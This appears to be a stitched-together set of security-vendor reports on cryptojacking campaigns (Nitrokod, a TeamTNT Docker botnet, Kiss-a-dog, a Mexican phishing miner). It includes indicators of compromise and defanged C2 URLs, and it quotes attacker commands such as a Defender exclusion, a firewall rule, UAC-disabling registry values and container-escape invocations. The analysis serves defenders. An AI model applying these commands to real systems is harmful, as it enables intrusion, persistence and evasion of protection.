+InstallService\4
+IOC
+Domain:
+Nitrokod[.]com
+Intelserviceupdate[.]com
+nvidiacenter[.]com
+MD5
+abe0fb9cd0a6c72b280d15f62e09c776
+a3d1702ada15ef384d1c8b2994b0cf2e
+668f228c2b2ff54b4f960f7d23cb4737
+017781535bdbe116740b6e569657eedf
+0cabd67c69355be4b17b0b8a57a9a53c
+27d32f245aaae58c1caa52b349bed6fb
+Summary:
+In this article, Check Point Research analyzed a new Turkish crypto miner campaign, called Nitrokod,
+which has attacked thousands of victims globally. The malware is easily dropped from software found on
+12/13
+top Google search results for legitimate applications.
+The malware is dropped from applications that are popular, but don’t have an actual desktop version such
+as Google Translate, keeping the malware versions in demand and exclusive.
+The malware drops almost a month after the infection, and following other stages to drop files, making it
+very hard to analyze back to the initial stage.
+GO UP
+13/13
+Coinminer, DDoS Bot Attack Docker Daemon Ports
+trendmicro.com/vinfo/hk-en/security/news/virtualization-and-cloud/coinminer-ddos-bot-attack-docker-daemon-ports
+Insights and Analysis by Augusto Remillano II and Jemimah Molina
+Researchers found an open directory containing malicious files, which was first
+reported in a series of Twitter posts by MalwareHunterTeam. Analyzing some of the
+files, we found a malicious cryptocurrency miner and Distributed Denial of Service
+(DDoS) bot that targets open Docker daemon ports.
+The attack starts with the shell script named mxutzh.sh, which scans for open ports (2375, 2376, 2377, 4243, 4244) and then
+creates an Alpine Linux container that will host the coinminer and DDoS bot.
+Figure 1. Snippet from mxutzh.sh
+The container created by the shell script will download init.sh, another shell script that will drop and execute its other components:
+Figure 2. init.sh executing other components 
+clean.sh – Searches for other coin miners and malware to clean/remove. It removes the Kinsing malware, which, according to
+reports, also targets vulnerable Docker servers.
+dns – The Kaiten/Tsunami DDoS bot
+lan.ssh.kinsing.ssh – Attempts lateral movement via SSH
+NarrenKappe.sh – Configures the firewall to allow ports that will be used by the other components, and sinkholes other
+domain names by editing the /etc/hosts file. It also exfiltrates sensitive information from its host machine.
+setup.basics.sh – Ensures that the utilities needed by the other components are installed in the system.
+setup.mytoys.sh – Downloads the source code of a log cleaner and compiles it. The script also downloads punk.py, which is a
+post-exploitation tool that attackers may use to pivot to other devices in the network.
+setup.xmrig.curl.sh – Downloads and installs the coinminer payload.
+sysinfo – Acquires various system information and reports it back to its C&C server.
+1/3
+Figure 3. The clean.sh component removes Kinsing malware
+Figure 4. File exfiltration function in the NarrenKappe.sh script
+Misconfigured Docker containers have always been vulnerable to similar threats; attacks using botnets and cryptocurrency miners
+have also been spotted in the past.
+[Related: Container Security: Examining Potential Threats to the Container Environment]
+Defense against Docker-related attacks
+As more workplaces embrace cloud environments, Docker containers are becoming more popular since they are relatively easy to
+deploy in a cloud. To protect these containers against attacks, the following practices are advised:
+Host containers in a container-focused OS to lessen the attack surface.
+Use controls such as intrusion prevention systems (IPS) and web filtering to examine network traffic.
+Limit access to only those who need it to lessen the chances of compromise.
+Perform the standard best practices.
+Users can also rely on the following security solutions to protect Docker containers:
+Trend Micro Hybrid Cloud Security – provides automated security and protects physical, virtual, and cloud workloads.
+Trend Micro Cloud One™ - provides visibility and protection against threats 
+Trend Micro Cloud One™ - Container Security performs automated container image and registry scanning.
+For security as software: Trend Micro Deep Security™ Software (workload and container security) and Trend Micro Deep
+Security Smart Check (container image security) for scanning container images to detect malware and vulnerabilities early on.
+Indicators of Compromise
+URLs
+hxxp://45[.]9[.]148[.]123/COVID19/nk/NarrenKappe.sh
+hxxp://45[.]9[.]148[.]123/COVID19/sh/clean.sh
+hxxp://45[.]9[.]148[.]123/COVID19/sh/lan.ssh.kinsing.sh
+hxxp://45[.]9[.]148[.]123/COVID19/sh/setup.basics.sh
+hxxp://45[.]9[.]148[.]123/COVID19/sh/setup.mytoys.sh
+hxxp://45[.]9[.]148[.]123/COVID19/sh/setup.xmrig.curl.sh
+hxxp://teamtnt[.]red/dns
+hxxp://teamtnt[.]red/sysinfo
+hxxp://teamtnt[.]red/up/setup_upload.php
+irc[.]kaiserfranz[.]cc
+2/3
+File Name
+SHA-256
+Trend Micro 
+Pattern Detection
+clean.sh
+6b8d828511b479e3278264eff68059f03b3b8011f9a6daaeff2af06b13ba6090
+Trojan.SH.HADGLIDER.C
+dns  
+init.sh
+6c73e45b06544fc43ce0e9164be52810884f317a710978c31462eb5b8ebc30cc Trojan.SH.HADGLIDER.D
+459190ba0173640594d9b1fa41d5ba610ecea59fd275d3ff378d4cedb044e26d
+Trojan.SH.HADGLIDER.A
+mxutzh.sh
+8926672fe6ab2f9229a72e344fcb64a880a40db20f9a71ba0d92def9c14497b6
+Coinminer.SH.HADGLIDER.A
+NarrenKappe.sh
+7d791ac65b01008d2be9622095e6020d7a7930b6ce1713de5d713fc3cccfa862 Trojan.SH.HADGLIDER.TSD
+setup.mytoys.sh
+b60be03a7305946a5b1e2d22aa4f8e3fc93a55e1d7637bebb58bf2de19a6cf4a
+Trojan.SH.HADGLIDER.F
+setup.xmrig.curl.sh bebaac2a2b1d72aa189c98d00f4988b24c72f72ae9348c49f62d16b433b05332 Trojan.SH.HADGLIDER.J
+sysinfo
+3c907087ec77fc1678011f753ddf4531a484009f3c64563d96eff0edea0dcd29
+TrojanSpy.SH.HADGLIDER.A
+Posted in Virtualization & Cloud
+Business 
+For Home 
+3/3
+New Kiss-a-dog Cryptojacking Campaign Targets
+Docker and Kubernetes
+crowdstrike.com/blog/new-kiss-a-dog-cryptojacking-campaign-targets-docker-and-kubernetes
+Manoj Ahuje
+October 26, 2022
+CrowdStrike has uncovered a new cryptojacking campaign targeting vulnerable
+Docker and Kubernetes infrastructure using an obscure domain from the payload,
+container escape attempt and anonymized “dog” mining pools.
+Called “Kiss-a-dog,” the campaign used multiple command-and-control (C2) servers
+to launch attacks that attempted to mine cryptocurrency, utilize user and kernel
+mode rootkits to hide the activity, backdoor compromised containers, move laterally
+in the network and gain persistence. 
+The CrowdStrike Falcon  platform helps protect organizations of all sizes from
+sophisticated breaches, including cryptojacking campaigns such as this. 
+®
+CrowdStrike has identified a new cryptojacking campaign targeting vulnerable Docker
+and Kubernetes infrastructure. Called “Kiss-a-dog,” the campaign targets Docker and
+Kubernetes infrastructure using an obscure domain from the payload, container escape
+attempt and anonymized “dog” mining pools.  
+CrowdStrike’s Cloud Threat Research team deploys and analyzes honeypots to
+understand how attackers target vulnerabilities and put cloud infrastructure at risk.
+CrowdStrike has previously uncovered campaigns targeting vulnerable cloud
+1/12
+infrastructure by cryptojacking botnets/groups like LemonDuck and Watchdog. Kiss-a-
+dog relies on tools and techniques previously associated with cryptojacking groups like
+TeamTNT, which targeted vulnerable Docker and Kubernetes infrastructure. 
+The CrowdStrike Falcon platform protects customers and comprehensively secures cloud
+environments against cryptojacking campaigns like Kiss-a-dog by delivering a powerful
+combination of agentless capabilities to protect against misconfigurations and control
+plane attacks and agent-based capabilities to protect cloud workloads with runtime
+security. 
+The CrowdStrike Falcon platform sets the new standard in cloud security.
+Watch this demo to see the Falcon platform in action.
+CrowdStrike Detection and Protection
+The Falcon platform unifies cloud security in a single platform to deliver comprehensive
+protection to its customers from any attacks on Docker and Kubernetes infrastructure. 
+With the Falcon platform, customers can implement “shift-left” strategies to identify
+vulnerabilities and misconfigurations at development stage to secure Kubernetes and
+Docker deployments out-of-the-box, while also monitoring production environments for
+any suspicious activity to stop campaigns like Kiss-a-dog. The suspicious activity by the
+Kiss-a-dog campaign is detected by CrowdStrike’s advanced machine learning and
+multiple behavior-based indicator of attacks (IOAs) in the killchain of the campaign.  
+The Falcon platform takes a defense-in-depth approach to protecting customers by
+leveraging incoming telemetry to power detection and provide real-time mitigation. It
+includes the following, which is used to detect a campaign like Kiss-a-dog:
+1. Host path mount to escape the container
+2. Rogue container running on your Docker instance
+3. Misconfigured Kubernetes or Docker instance
+Figures 1.A and 1.B show High Confidence detection of a malicious service to run
+[CMAKE], which is disguised xmrig.
+Figure 1.A
+2/12
+Figure 1.B
+Figures 1.A and 1.B. Disguised miner process identified and killed by the Falcon platform
+Moreover, the Falcon platform analyzes suspicious images and detects runtime malicious
+activity, network connections along with vulnerability analysis of the image to provide in-
+depth reports, as shown in Figure 2.
+Figure 2. Falcon Dynamic Container Analysis report
+See for yourself how the industry-leading CrowdStrike Falcon platform
+protects your cloud environments. Start your 15-day free trial today.
+Kiss-a-Dog Campaign Targets Docker
+3/12
+In mid-2022, a crypto crash caused havoc in the digital currency market where several
+currencies — including Bitcoin — dropped 40% to 90% and some of them perished.
+During this period, cryptomining activity targeting digital currencies on containerized
+environments remained muffled until now.
+In September 2022, one of CrowdStrike’s honeypots spotted a number of campaigns
+enumerating vulnerable container attack surfaces like Docker and Kubernetes. As
+CrowdStrike monitors exposed Docker APIs, the following compromised Docker
+container triggered additional investigation. Figure 3 shows the entry point used to
+trigger the initial payload.
+The Base64-encoded payload is a Python command that downloads a malicious payload
+t.sh from the domain  kiss[.]a-dog[.]top  — hence the Kiss-a-dog campaign name.
+The entry point verifies and installs cURL using a package manager and adds a malicious
+payload as a cron job. Let’s take a closer look at this payload and subsequent campaign.
+Figure 3. Kiss-a-dog entry point
+Use of Obscured Domain
+The entry point payload used in the initial Docker compromise is a Python code under the
+wrap, as shown in Figure 4 after Base64 decode. The URL used in the payload is obscured
+with backslashes to defeat automated decoding and regex matching to retrieve the
+malicious domain. The Python urllib2 library sanitizes the back slashes as part of its
+validation to form a valid domain name  kiss[.]a-dog[.]top  before querying a DNS
+(Domain Name System) server. Attackers used it to their advantage — Figure 5 shows a
+successful DNS query after parsing an actual domain name. With successful name
+resolution, attackers download the first payload  t.sh  from a C2 server, which is saved
+and executed as  .1 .
+Figure 4. Decoded Kiss-a-dog entry point
+4/12
+Figure 5. Successful DNS query
+Container Escape
+Container escape is the essential part of utilizing the resources on the host and moving
+laterally into the compromised network. The Kiss-a-dog campaign uses a host mount to
+escape from the container. The technique itself is not new and seems to be common
+among cryptominers as an attempt to break out of containers. This is attributed to a lack
+of innovation by attackers and at the same time speaks to the vast and easy Docker attack
+surface exposed and available on the internet. Per Shodan, there are 10,000+ Docker
+instances exposed to the internet, as shown in Figure 6.
+Figure 6.A Docker instances exposed to internet (per Shodan)
+5/12
+Figure 6.B Kubernetes instances exposed to internet (per Shodan)
+Removal of Cloud Monitoring Service 
+Agent-based cloud monitoring services still remain an easy target for cryptominers, as
+they can be removed from cloud instances. After a container escape with root privileges, it
+is an easy step for an attacker to determine if an instance has a cloud monitoring service
+installed, and if so, then attackers move on to stopping and uninstalling the cloud
+monitoring service. The Kiss-a-dog campaign reused the following code to remove the
+service (shown in Figure 7). The code is traced to multiple public GitHub repositories.
+6/12
+Figure 7. Uninstall aegis service
+Kernel Headers and GCC
+Downloading the pre-compiled binary tools can cause compatibility issues with
+compromised container’s architecture and flavor. To avoid that, the Kiss-a-dog campaign
+prefers to compile code on compromised containers for multiple tools required in the next
+stages of the campaign. The attacker installed a relevant kernel header and GCC to
+compile container Linux architecture and flavor-specific binaries to use on the same
+container.
+Use of Traditional Kernel Rootkits Diamorphine and Libprocesshider
+The Kiss-a-dog campaign uses the Diamorphine and libprocesshide rootkits to hide the
+process from the user space, where the typical cloud practitioner will look for malicious
+activities. Both rootkits are known to hide processes from the user.
+To avoid detection on the network, the Kiss-a-dog campaign chose to encode the C/C++
+code files and embed as a Base64 string into the script, as shown in Figure 8. At runtime,
+attackers decoded the Base64 string as  .tar  file, which contains code for the
+Diamorphine rootkit. It is then compiled using GCC to create the file  diamorphin.ko ,
+which is loaded as a kernel module using the insmod command.
+7/12
+Figure 8. Diamorphine rootkit compiled and loaded into the kernel
+Attackers used a similar technique to compile the libprocesshider rootkit as a shared
+library. The difference is that the shared library path is set as LD_PRELOAD. This allows
+the attackers to inject malicious shared libraries into every process spawned on a
+compromised container.
+Use of Dog Pools and Disguised Xmrig
+The motive behind the Kiss-a-dog campaign is to run a cryptominer to mine a digital
+currency. Attackers are using XMRig, a popular mining software, to mine the
+cryptocurrency. 
+Cryptojacking groups don’t like to advertise their wallet addresses because in the past,
+researchers have found their earnings per day and per campaign by tracking wallet
+transactions. Instead, attackers hide wallet addresses by creating anonymous pool servers
+where mining peers — like your compromised container — contribute compute efforts
+anonymously.
+Interestingly, attackers used  love[.]a-dog[.]top  and  touch[.]a-dog[.]top  as
+pool servers to hide the Kiss-a-dog campaign’s wallet addresses. Figure 9.A shows the
+pool used in the configuration of XMRig. The campaign also disguises XMRig as
+[CMAKE]  and installs a service to run the binary as  cmake.service , as shown in Figure
+9.B.
+8/12
+Figure 9.A. Pool configuration for the Kiss-a-dog campaign
+Figure 9.B Disguised XMRig as [CMAKE]
+Use of Pnscan, Zgrab and Masscan
+Apart from cryptojacking, the secondary goal of the campaign is to reach out to as many
+vulnerable instances of Redis and Docker as possible. To achieve this goal, attackers
+download and compile network-scanning tools like pnscan, masscan and zgrab on the
+compromised container. These tools then randomly scan the IP ranges on the internet to
+look for vulnerable instances of Docker and Redis servers. Figure 10 shows all of the tools
+in action.
+9/12
+Figure 10. Masscan, zgrab and pnscan in action
+Redis as a Backdoor
+The Kiss-a-dog campaign installs a Redis server in the background and listens on port
+6379 for any incoming connection. The Redis server is mostly used to backdoor the
+container where cron jobs are set to run additional scripts for mining and pivoting, as
+shown in Figure 11.
+Figure 11. Redis server installed on a container
+Multiple Campaigns
+The CrowdStrike Cloud Threat Research team detected multiple campaigns targeting
+Docker from the same C2 servers previously used by TeamTNT. Table 1 shows some of the
+malicious payloads used in different campaigns started by TeamTNT. According to our
+research, the tactics, techniques and procedures of the attack are very similar in all of the
+campaigns.
+10/12
+Table 1. Campaign payloads by TeamTNT
+Conclusion 
+Cryptojacking groups are opportunistically targeting vulnerable Docker and Kubernetes
+environments to mine cryptocurrency. The campaigns by cryptojacking groups last from
+days to months depending on the success rate. As cryptocurrency prices have dropped,
+these campaigns have been muffled in the past couple of months until multiple campaigns
+were launched in October to take advantage of a low competitive environment. Cloud
+security practitioners need to be aware of such campaigns and make sure that their cloud
+infrastructure doesn’t fall prey. 
+Securing containers doesn’t need to be an overly complex task. The Falcon platform
+provides a unified approach to cloud security, delivering a powerful combination of
+agentless capabilities to identify security issues in your environment in real time and
+agent-based capabilities to protect workloads and secure your cloud environments with
+runtime security.
+CrowdStrike strives to enable organizations to stay ahead of the curve and remain fully
+protected from adversaries and breaches.
+Additional Resources
+Learn how you can stop cloud breaches with CrowdStrike unified cloud security
+for multi-cloud and hybrid environments — all in one lightweight platform.
+11/12
+Build, run and secure cloud-native applications with speed and confidence using
+Falcon Cloud Workload Protection.
+To learn more about the cloud threat landscape, download “Protectors of the
+Cloud: Combating the Rise in Threats to Cloud Environments.” 
+Visit the Falcon Cloud Workload Protection Complete™ product webpage to see if
+a managed detection and response solution for cloud workloads is right for your
+organization.
+Learn how the powerful CrowdStrike Falcon® platform provides comprehensive
+protection across your organization, workers and data, wherever they are located.
+Get a full-featured free trial of CrowdStrike Falcon Prevent™ and see for yourself
+how true next-gen AV performs against today’s most sophisticated threats.
+12/12
+Crypto miners’ latest techniques
+cybersecurity.att.com/blogs/labs-research/crypto-miners-latest-techniques
+1. AT&T Cybersecurity
+2. Blog
+August 29, 2022  |  Fernando Martinez
+Executive summary
+Crypto miners are determined in their objective of mining in other people's resources. Proof of this is one of the latest samples
+identified with AT&T Alien Labs, with at least 100 different loaders and at least 4 different stages to ensure their miner and
+backdoor run smoothly in the infected systems.
+Key takeaways:
+Attackers have been sending malicious attachments, with a special emphasis on Mexican institutions and citizens.
+The techniques observed in these samples are known but still effective to keep infecting victims with their miners.
+Reviewing them assists in reminding defenders the current trends and how to improve their defenses.
+The wide variety of loaders in conjunction with the staged delivery of the miner and backdoor malwares, shows how
+determined the attackers are to successfully deliver their payloads.
+Analysis
+Crypto miners have been present in the threat landscape for some years, since an attacker identified the opportunity of
+leveraging victim’s CPUs to mine cryptocurrencies for them. Despite the current rough patch in the world of cryptocurrencies,
+these miners are still present and will be in the foreseeable future.
+As seen in the current analysis, unlike IoT malwares, which also attempt to reach the biggest number of infected devices as
+possible, these miners  target victims through phishing samples. The techniques used by these malwares are usually focused
+on reaching execution, avoiding detection to run under the radar and gaining persistence to survive any reboot.
+A new miner sample showed up in April on AT&T Alien Labs radar, with a wide range of different loaders aiming to execute it
+in infected systems up to this day. The loaders were initially delivered to the victims through an executable disguised like a
+spreadsheet. For example, one of the samples (fd5131645025e199caa142c12cef34b344437a0f58306f9b66c35d32618665ba)
+carries a Microsoft Excel icon, but its file extension corresponds to an executable.
+A wide range of decoy documents were found associated with this miner, many of them associated with Mexican civilians:
+exam results, dentist results, Mexican Governmental documents, Mexican Social Security, Tax returns, etc. Figure 1
+corresponds to one of the spreadsheets observed. The campaign identified in this report materialized most of its attacks
+1/6
+during the second half of June 2022. For example, the mentioned file above was compiled in late May 2022 and was first
+observed in the wild a month after, on June 20, 2022.
+Figure 1. Decoy spreadsheet ‘ppercepciones anuales.xlsx’.
+At the time of execution, the first activities performed are registry changes to cloak the malware samples. For example, by
+setting ‘HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt’ to 1, the
+attackers are hiding the file extensions and camouflaging the executables as documents. Additionally, the registry key
+‘HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden’ is set to 0 to avoid
+displaying in explorer the hidden files dropped during execution. Finally ‘
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin’
+is set to 0 in order to execute any future samples with elevated privileges without explicit consent in the form of a pop up or
+inserting credentials.
+The initial payload drops another executable file while opening the spreadsheet in Figure 1. This additional executable
+attempts to look like a legitimate executable. It is named ‘CmRccService.exe’ and has the same filename as the metadata
+associated with the product’s name, description and comments. It is probably an attempt to masquerade the process by
+making it similar to the legitimate Microsoft process ‘CmRcService.exe’ (Configuration Manager Remote Control Service)
+(T1036.004). However, the legitimate files owned by Microsoft would have been signed with Microsoft certificate, which is not
+the case for these files - which have not been signed at all.
+Pivoting by this indicator, returns over a hundred different samples that have been created and delivered during the last three
+months, most of them in the last weeks. In addition to the product name ‘CmRccService.exe’, a similar decoy name was
+observed in this campaign ‘RegistryManager.exe’, which showed up in at least 6 different samples. The RegistryManager
+samples even carry a Copyright flag associated with Microsoft Corporation, lacking once again the corresponding file
+signature. These files are allocated under the folder ‘C:\Windows\ImmersiveControlPanel’ in an attempt to make the
+processes look as legitimate as possible.
+Persistence of the whole process is attempted during the execution of ‘CmRccService.exe’. A new service is registered in the
+system (T1543.003), to be run with highest privileges each time the user logs on.
+Figure 2. Persistence mechanism.
+This loader reaches out to several domains hosting the payloads for next stages, configuration files and one-line commands to
+be executed.
+One of these domains is ‘bekopgznpqe[.]is’. Initially created on February 22, 2022 with the name server 1984 Hosting
+Company, who offers domain names registration free of charge. However, since this behavior indicator makes the domain
+look suspicious to security companies, the domain was moved to Cloudflare on April 21 (a different nameserver with a better
+2/6
+reputation due to its popularity and absence of free offerings). This technique has historically been used to improve the
+reputation of domains right before they are used during a campaign.
+Additionally, the malware attempts to contact a supplemental domain   ’dpwdpqshxux[.]ru,’ which does not yet resolve but was
+created on February 21, 2022, a day before ‘bekopgznpqe’ domain. There is no historical data of it ever resolving to any IP. For
+this reason, the domain is probably a backup plan, to be used if the first stops working.
+The third and last domain identified during analysis did not follow the above pattern. The domain ‘2vkbjbpvqmoh[.]sh‘ was
+created in January 2022 in the Njalla name server, known and marketed as a great offering for ‘Privacy as a Service’ for
+domains and VPNs. After some time operating, the domain was marked for deletion in May 2022.
+Before executing the third stage payload, Cmrcservice performs several modifications to the FireWall to allow inbound and
+outbound connections to the files it will drop afterwards. The executed command for these changes is
+‘'C:\Windows\System32\cmd.exe' /C powershell New-NetFirewallRule -DisplayName 'RegistryManager' -Direction Inbound
+-Program 'C:\Windows\ImmersiveControlPanel\RegistryManager.exe' -Action Allow’.
+Furthermore, the malware includes exclusions to the Microsoft Windows Defender for the folders from where the malware
+will be executing or the files it intends to execute (T1562). The command used for this purpose is ‘powershell.exe $path =
+'C:\Windows\Branding\oidz.exe' ; Add-MpPreference -ExclusionPath $path -Force’. The excluded folders and files include:
+C:\Users
+C:\Windows
+C:\Windows\Temp
+C:\Windows\ImmersiveControlPanel
+C:\Windows\ImmersiveControlPanel\CmRccService.exe
+C:\Windows\Branding
+C:\Windows\Branding\umxn.exe
+C:\Windows\Branding\oidz.exe
+C:\Windows\Help\Windows
+C:\Windows\Help\Windows\MsMpEng.exe
+C:\Windows\IME
+The third stage payload is formed by the ‘p.exe’ executable, which doesn’t hide its contents, since the file’s metadata claims the
+filename is ‘payload.exe’. During execution, p drops two additional files: ‘oidz.exe‘ and ‘umxn.exe’, which correspond to the
+final payloads. Figure 3 recaps the execution flow until this point.
+[1]
+Figure 3. Execution tree.
+‘Oidz.exe‘ runs an infinite loop, as seen in Figure 4, that will reach out to the Command & Control (C&C) looking for new
+commands to execute. After execution, it includes a sleep command to separate the requests for additional commands as well
+as its executions. In other words, this executable corresponds to the backdoor installed in the system.
+The commands to be executed are uploaded by the attackers to the C&C servers, and oidz reaches out to specific files in the
+server and executes them, allowing the attackers to maintain any payload updated or modify its capabilities (T1102.003). This
+file does not aim to be persistent in the system since the grandparent process ‘Cmrcservice.exe’ already is. The C&C servers
+3/6
+list seen in Figure 5, has a first parameter corresponding to the command to execute, while the second parameter corresponds
+to the flag of the command to be executed. This list of domains corresponds to the one used previously by ‘CmRccService’.
+Figure 4. Oidz infinite loop.
+Figure 5. C&C list.
+Finally, ‘umxn.exe’ corresponds to the crypto miner that will run with the configuration pulled from one of the C&C and
+stored in ‘%windir%\Help\Windows\config.json’. All the other files were preparing the environment for the miner, avoiding
+issues with execution, network communications or enabling modifications during the execution with the backdoor.
+Since it was first observed in April 2022, some of the executables have changed names or had some variations but have been
+excluded throughout the report to avoid confusion. The execution line in this report and observed in Figure 3 is the most
+common one observed. One of the most remarkable mentioned variations, include file ‘MsMpEng.exe’ or ‘McMpEng.exe’,
+which is an additional stage executed by ‘umxn.exe’. This sample claims in its PE metadata to be ‘Antimalware Service
+Executable’ to disguise its true nature.
+Figure 6. MsMpEng.exe metadata.
+Conclusion
+AT&T Alien Labs has provided an overview on an ongoing crypto mining campaign that caught our eye due to the big number
+of loaders that have shown up during the month of June, as well as how staged the execution is for a simple malware like a
+miner. Alien Labs will continue to monitor this campaign and include all the current and future IOCs in the pulse in Appendix
+B.
+Associated indicators (IOCs)
+The following technical indicators are associated with the reported intelligence. A list of indicators is also available in the OTX
+Pulse. Please note, the pulse may include other activities related but out of the scope of the report.
+4/6
+TYPE
+INDICATOR
+DESCRIPTION
+SHA256
+fd5131645025e199caa142c12cef34b344437a0f58306f9b66c35d32618665ba
+ppercepciones anuales.xlsx
+SHA256
+00ba928455d7d8a92e5aeed3146925086c2451501e63a0d8ee9b7cbaaf1007de CmRccService.exe
+SHA256
+8f0dc8c5e23ee42209e222db5a8cf8ee6e5d10b5dde32db5937d4499deef0302
+RegistryManager.exe
+SHA256
+f77522d8476969ae13f8823b62646a9f2cec187e2d0e55298389b8ced60dd0c8
+p.exe
+SHA256
+ec4c48ac55139c6e4f94395aca253d54e9bbc864cc0741f8e051d31cd7545620
+umxn.exe
+SHA256
+c0dc67bfcefa5a74905f0d3a684e7c3214c5b5ca118e942d2f0cc2f53c78e06c
+oidz.exe
+SHA256
+18493e0492eb276af746e50dee626f4d6a9b0880f063ebb77d8f3b475669bf65
+Sample miner configuration
+DOMAIN 2vkbjbpvqmoh[.]sh
+DOMAIN bekopgznpqe[.]is
+DOMAIN dpwdpqshxux[.]ru
+Mapped to MITRE ATT&CK
+The findings of this report are mapped to the following MITRE ATT&CK Matrix techniques:
+Malware and config server
+Malware and config server
+Unresolved domain
+TA0001: Initial Access
+T1566: Phishing
+T1566.001: Spearphishing Attachment
+TA0002: Execution
+T1059: Command and Scripting Interpreter
+T1059.001: PowerShell
+T1059.003: Windows Command Shell
+T1204: User Execution
+T1204.002: Malicious File
+T1569: System Services
+T1569.002: Service Execution
+TA0003: Persistence
+T1543: Create or Modify System Process
+T1543.003: Windows Service
+TA0004: Privilege Escalation
+T1543: Create or Modify System Process
+T1543.003: Windows Service
+TA0005: Defense Evasion
+T1027: Obfuscated Files or Information
+T1027.002: Software Packing
+T1036: Masquerading
+T1036.004: Masquerade Task or Service
+T1562: Impair Defenses
+T1562.001: Disable or Modify Tools
+T1562.004: Disable or Modify System Firewall
+TA0011: Command and Control
+T1102: Web Service
+T1102.003: One-Way Communication
+TA0040: Impact
+T1496: Resource Hijacking
+5/6
+TA0042: Resource Development
+T1583: Acquire Infrastructure
+T1583.006: Domains
+[1]EXE icon by Icons8; Cog icon by Icons8; XLS icon by Icons8
+Share this with others
+Tags: alien labs, otx pulse, cryptomining
+6/6
+Deep Analysis of TeamTNT Techniques Using
+Container Images to Attack
+blog.aquasec.com/container-security-tnt-container-attack
+Roi Kol
+August 25, 2020
+This blog was co-authored with Assaf Morag, Lead Security Analyst at Aqua Security
+Ever notice how news about hidden malware almost always focuses on remediation
+AFTER the fact? So did we. Even now, there’s yet another news story about a rash of
+attacks by a group called TeamTNT. They used a crypto-mining worm to steal AWS
+credentials from Docker Hub. Well, if hijacking cloud resources is so popular, it’s time to
+make finding threats BEFORE the attack just as fashionable. Our investigation
+determined that dynamic analysis could have saved some overworked security teams a lot
+of time and aggravation — if these images were detected and removed from Docker Hub
+before being deployed — in much the same way it helps security teams with their private
+registries.
+We at Team Nautilus detected and analyzed the Docker Hub account hildeteamtnt, which
+was used by TeamTNT to store their malicious images. We ran these images in a secure
+container sandbox and uncovered a total of eight malicious container images, with at least
+two of these images being used to perform attacks in the wild. Here’s what was found:
+1/9
+Images in the hildeteamtnt account
+The images were well-designed and meticulously built to fully exploit the targeted host.
+The adversaries hid various malware executables (Tsunami and Mirai), backdoors,
+Docker escape tools, and Potentially Unwanted Applications (PUAs) inside these images.
+In each image, they used scripts to execute their nefarious attacks, some of which were
+simple and straightforward, while others were complex and sophisticated:
+1. Simple and straightforward attacks: ‘metal3d’, ‘first’ and ‘dockerfirst’ are
+images were designed to launch a simple resource hijacking attack (Cryptominer).
+2. Sophisticated attacks: ‘Minerescape’ and ‘Debian-service’ contain a binary
+named docker-escape. The binary is based on a tool in GitHub docker-escape-tool.
+Designed to identify if it’s running in a Docker container, it then attempts Docker
+escape techniques.
+For instance, this binary contains some of the following strings:
+.\docker_escape network - Attempts to escape via Docker TCP socket (if found on
+any interfaces) or Port scans (if network namespace shared with the host).
+.\docker_escape auto - Attempts automatic escape. If successful, this starts a
+privileged container with the host drive mounted at /hostOS.
+.\docker_escape Unix - Attempts an escape using a mounted Docker UNIX socket
+located at /var/run/docker.sock.
+Also, ‘minerescape’ contained a shell script executing a Python file - minedaemon.py. The
+file nightminer.py allows the execution of the crypto mining process.
+2/9
+3. Highly sophisticated attacks: Since the first tool ‘xmrigminer’ was uploaded on
+March 28, 2020, adversaries worked to perfect it by revising their scripts and adding
+more and more techniques to evade detection, hide communication channels with
+command and control servers, and gain persistence over time. The second image ‘avscan’
+is a more sophisticated version (described below) and the last and recent version
+‘docrunker’ is even worse.
+Deep Analysis of AVscan
+The adversaries used a known technique aimed at taking over the host by mounting the
+host / dir into /mnt in the container and then chrooting into /mnt.
+AVscan.sh
+The entry point for the image is the script AVscan.sh: 
+Following that command, the image is designed to run the scripts Carray.sh, cron.sh, and
+execute two malicious binaries SystemHealt and AVscan. The command
+vm.nr_hugepages is a system property that is designed to increase the efficacy of the
+crypto-mining process. 
+3/9
+The scripts Carray.sh and cron.sh are already stored inside the image layers.
+Carray.sh
+The shell script Carray.sh is designed to kill any competing mining processes running on
+the host. The script also deletes itself after it is executed.
+Cron.sh
+The shell script Cron.sh sets a cron job to download  minion.sh from: 
+hxxp [:] //yd6ugsklvmydbvmntk54k4dmgkuwzar3u3zzv5vcxwdywjwbwzjmdryd [.]
+tor2web [.] su/.../minion.sh
+Minion.sh
+Some of the snippets in this script are encoded with Based64. The adversaries decode this
+code into new files using innocuous or misleading names such as: pu,ntpd.pid,.logs.c, etc.
+They also hide some of the files they are writing to disk. Below are three examples of what
+this script is doing:
+One file (/usr/bin/hid) is trying to mount given PID from the directory
+/proc/<PID> into /usr/foo. This process is done stealthily without leaving traces in
+/etc/mtab.
+Another file (/usr/bin/pu) is a Python script designed to conduct lateral movement
+in the network by exploiting the SSH port. 
+4/9
+Last, but not least, another file (/tmp/.logs.c) is used to clean all login and logout
+records on the system (WTMP, UTMP, and Lastlog for Linux). This exemplifies the
+level of effort that these adversaries are taking to clean their records and maintain
+high standards of OPSEC.
+This script also deactivates any programs competing for resources on the CPU, such as
+xmrigMiner and Watchdog. Once the script is done, it deletes itself and history.
+This script downloaded and executed three other scripts (user.sh, sbs.sh, sxc.sh):
+The script user.sh: Responsible for SSH communication with the infected host:
+Verifying that SSHD exists, and if not download, installs an Openssh-server.
+Trying to create three users (hilde, reboot, ubuntu).
+Attempting to grant the users root privileges.
+Appending the adversary’s RSA-keys for the above-mentioned users (hilde, reboot,
+ubuntu) into:
+/home/$usersname/.ssh/authorized_keys
+/home/$usersname/.ssh/authorized_keys2
+Setting root to be able to SSH login with no password in: /etc/ssh/sshd_config. and
+restart SSHD. 
+Using a web service (iplogger[.]org)  to transmit collected data to the attacker during
+the discovery process, for instance, the number of cores in the CPU, its speed,
+system details (using uname -a), and targeted host IP address.
+Logging the activity and encoding it into files (using Base64).
+The script sbs.sh: 
+Downloading 00.jpg (as /usr/bin/dns_ipv4.tar.gz) which is the file /usr/bin/bioset.
+Executing Bioset:
+Renaming the process to be systemd.
+Listening to any connection on port 1982. Each new connection opens a new
+thread.
+Creating a child process that listens to the socket and communicates with the
+father using a method called ‘Named PIPE’ (also known as FIFO). 
